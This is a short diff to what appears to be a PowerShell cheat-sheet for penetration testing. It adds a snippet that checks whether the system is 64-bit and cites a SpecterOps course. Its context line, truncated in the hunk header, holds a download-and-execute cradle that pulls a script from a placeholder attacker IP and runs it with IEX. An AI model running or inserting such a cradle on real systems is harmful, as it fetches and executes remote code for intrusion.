@@ -68,6 +68,10 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>:8090/P
 ```Powershell
 $ErrorActionPreference = "SilentlyContinue" # / "Stop" / "Inquire" / "Continue" (Default) / "Suspend"
 ```
+#### Test if 32-bit system or 64-bit
+```Powershell
+[Environment]::Is64BitOperatingSystem
+```
 
 ## Sources
 - https://github.com/specterops/at-ps (Amazing course, very recommended)
